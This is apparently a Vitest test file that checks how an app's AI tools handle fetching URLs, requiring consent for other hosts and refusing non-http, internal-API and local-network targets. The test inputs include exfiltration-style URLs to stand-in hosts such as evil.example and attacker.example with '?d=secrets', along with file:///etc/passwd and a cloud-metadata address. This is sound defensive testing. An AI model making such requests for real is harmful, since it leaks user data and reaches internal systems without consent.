import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { BetaRunnableTool } from '@anthropic-ai/sdk/lib/tools/BetaRunnableTool'
import { EntityStore } from '../../../core/entity/store'
import { createMap } from '../../maps/maps'
import type { AppHost } from '../tools'

/**
 * A URL in a tool call may come from the model, a bundle or a page it read —
 * not from the user. Every tool that fetches one goes through
 * `fetchHandedUrl`: http(s) only, this origin freely, anywhere else only
 * with Third-party services on and the user's yes, naming the host.
 */
const mem: Record<string, string> = {}
const storage = { getItem: (k: string) => mem[k] ?? null, setItem: (k: string, v: string) => (mem[k] = v), removeItem: (k: string) => delete mem[k] }
vi.stubGlobal('localStorage', storage)
const { setUserSettings } = await import('../../account/settings')
const { createMoreTools } = await import('../moreTools')
const { createGraphTools } = await import('../graphTools')
const { createProjectTools } = await import('../projectTools')
const { createMediaTools } = await import('../mediaTools')

const geojson = JSON.stringify({ type: 'FeatureCollection', features: [{ type: 'Feature', properties: { name: 'Kyoto' }, geometry: { type: 'Point', coordinates: [135.76, 35.01] } }] })
const fetchSpy = vi.fn<typeof fetch>(async () => new Response(geojson))

function setup(answer: boolean) {
  const store = new EntityStore()
  const asked: string[] = []
  const host: AppHost = { store, navigate: () => {}, getContext: () => ({ route: '/' }), confirm: async (m) => (asked.push(m), answer) }
  const tools = [...createMoreTools(host), ...createGraphTools(host), ...createProjectTools(host)] as BetaRunnableTool[]
  const run = (name: string) => {
    const t = tools.find((x) => x.name === name)!
    return async (input: unknown) => JSON.parse(String(await t.run(t.parse(input))))
  }
  const map = createMap(store, { label: 'Trip' })
  return { store, asked, run, map }
}

beforeEach(() => {
  fetchSpy.mockClear()
  vi.stubGlobal('fetch', fetchSpy)
  vi.stubGlobal('localStorage', storage)
  vi.stubGlobal('location', new URL('http://127.0.0.1:5199/maps'))
  setUserSettings({ externalServices: true })
})
afterEach(() => vi.unstubAllGlobals())

describe('a URL handed to a tool', () => {
  it('on this origin is fetched without asking', async () => {
    const { asked, run, map } = setup(true)
    expect((await run('map_import')({ map_id: map.id, url: '/datasets/kyoto.geojson' })).added).toBe(1)
    expect(asked).toEqual([])
    expect(String(fetchSpy.mock.calls[0][0])).toBe('http://127.0.0.1:5199/datasets/kyoto.geojson')
  })

  it('elsewhere is put to the user, naming the host; a no fetches nothing', async () => {
    const { asked, run, map } = setup(false)
    await expect(run('map_import')({ map_id: map.id, url: 'https://evil.example/x.geojson?d=secrets' })).rejects.toThrow(/declined to let evil\.example/)
    await expect(run('import_graph')({ url: 'https://evil.example/g.graphml' })).rejects.toThrow(/declined/)
    await expect(run('project_open_bundle')({ url: 'https://evil.example/p.aeb' })).rejects.toThrow(/declined/)
    expect(asked).toHaveLength(3)
    expect(asked[0]).toMatch(/evil\.example/)
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  it('elsewhere, with a yes, is fetched', async () => {
    const { asked, run, map } = setup(true)
    expect((await run('map_import')({ map_id: map.id, url: 'https://data.example/kyoto.geojson' })).added).toBe(1)
    expect(asked).toHaveLength(1)
  })

  it('asks a SPARQL endpoint for RDF it can read — Wikidata answers a CONSTRUCT in RDF/XML otherwise', async () => {
    const { run } = setup(true)
    fetchSpy.mockImplementationOnce(async () => new Response('<http://www.wikidata.org/entity/Q1> <http://www.wikidata.org/prop/direct/P737> <http://www.wikidata.org/entity/Q2> .\n'))
    const q = encodeURIComponent('CONSTRUCT { ?a <http://www.wikidata.org/prop/direct/P737> ?b } WHERE { ?a <http://www.wikidata.org/prop/direct/P737> ?b } LIMIT 1')
    const r = await run('import_graph')({ url: `https://query.wikidata.org/sparql?query=${q}`, format: 'rdf', dry_run: true })
    expect(r).toMatchObject({ dryRun: true, relationships: 1 })
    const init = fetchSpy.mock.calls[0][1] as RequestInit
    expect(String((init.headers as Record<string, string>).accept)).toMatch(/^application\/n-triples/)
    // A file that is not RDF is fetched as it always was.
    fetchSpy.mockClear()
    await run('map_import')({ url: 'https://data.example/kyoto.geojson', map_id: createMap(new EntityStore(), { label: 'x' }).id }).catch(() => {})
    expect(fetchSpy.mock.calls[0]?.[1]).toBeUndefined()
  })

  it('is refused when it names the site’s own functions — /api/fetch would reach any host unasked', async () => {
    const { asked, run, map } = setup(true)
    for (const url of ['/api/fetch?url=https://attacker.example/?d=secrets', 'http://127.0.0.1:5199/api/openai/v1/audio/speech', '/%61pi/fetch?url=x', '/API/fetch?url=x'])
      await expect(run('map_import')({ map_id: map.id, url })).rejects.toThrow(/site's own functions/)
    await expect(run('import_graph')({ url: '/api/fetch?url=https://x.example/g.gexf' })).rejects.toThrow(/own functions/)
    expect(asked).toEqual([])
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  it('is refused when it is not http(s), before anyone is asked', async () => {
    const { asked, run, map } = setup(true)
    for (const url of ['javascript:alert(1)', 'file:///etc/passwd', 'data:application/json,{}'])
      await expect(run('map_import')({ map_id: map.id, url })).rejects.toThrow(/http or https/)
    expect(asked).toEqual([])
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  it('elsewhere, with Third-party services off, refuses without asking', async () => {
    setUserSettings({ externalServices: false })
    const { asked, run, map } = setup(true)
    await expect(run('map_import')({ map_id: map.id, url: 'https://data.example/kyoto.geojson' })).rejects.toThrow(/Third-party services is off/)
    expect(asked).toEqual([])
    expect(fetchSpy).not.toHaveBeenCalled()
  })

  describe('create_image: loading a picture is a request to its host', () => {
    /** The browser's Image, recording what it was asked to load. */
    const loaded: string[] = []
    class FakeImage {
      naturalWidth = 10
      naturalHeight = 10
      onload: (() => void) | null = null
      onerror: (() => void) | null = null
      set src(v: string) {
        loaded.push(v)
        queueMicrotask(() => this.onload?.())
      }
    }
    const createImageTool = (answer: boolean) => {
      const { store, asked } = setup(answer)
      const host: AppHost = { store, navigate: () => {}, getContext: () => ({ route: '/' }), confirm: async (m) => (asked.push(m), answer) }
      const t = createMediaTools(host).find((x) => x.name === 'create_image') as BetaRunnableTool
      return { store, asked, run: async (input: unknown) => JSON.parse(String(await t.run(t.parse(input)))) }
    }
    beforeEach(() => {
      loaded.length = 0
      vi.stubGlobal('Image', FakeImage)
    })

    it('another host is put to the user, naming it, before anything loads; a no creates nothing', async () => {
      const { store, asked, run } = createImageTool(false)
      await expect(run({ url: 'https://evil.example/pixel.png?d=secrets', open: false })).rejects.toThrow(/declined to let evil\.example/)
      expect(asked).toHaveLength(1)
      expect(asked[0]).toMatch(/evil\.example/)
      expect(loaded).toEqual([])
      expect(store.ofType('image')).toHaveLength(0)
    })

    it('with a yes, it is loaded and made', async () => {
      const { store, asked, run } = createImageTool(true)
      const r = await run({ url: 'https://pics.example/cat.png', open: false })
      expect(asked).toHaveLength(1)
      expect(loaded).toEqual(['https://pics.example/cat.png'])
      expect(store.get(r.id)?.data).toMatchObject({ src: 'https://pics.example/cat.png', width: 10 })
    })

    it('with Third-party services off, another host is refused without asking', async () => {
      setUserSettings({ externalServices: false })
      const { store, asked, run } = createImageTool(true)
      await expect(run({ url: 'https://pics.example/cat.png', open: false })).rejects.toThrow(/Third-party services is off/)
      expect(asked).toEqual([])
      expect(loaded).toEqual([])
      expect(store.ofType('image')).toHaveLength(0)
    })

    it('this origin’s own picture, or one carried in the call, needs no question', async () => {
      const { asked, run } = createImageTool(false)
      await run({ url: '/assets/figure.png', open: false })
      await run({ url: 'data:image/png;base64,iVBORw0KGgo=', open: false })
      expect(asked).toEqual([])
      expect(loaded).toEqual(['http://127.0.0.1:5199/assets/figure.png', 'data:image/png;base64,iVBORw0KGgo='])
    })
  })

  it('with no page (the headless engine) never reaches this machine or its network', async () => {
    vi.stubGlobal('location', undefined)
    const { run, map } = setup(true)
    for (const url of ['http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:5432/', 'http://localhost:8080/admin'])
      await expect(run('map_import')({ map_id: map.id, url })).rejects.toThrow(/this machine or its local network/)
    expect(fetchSpy).not.toHaveBeenCalled()
  })
})
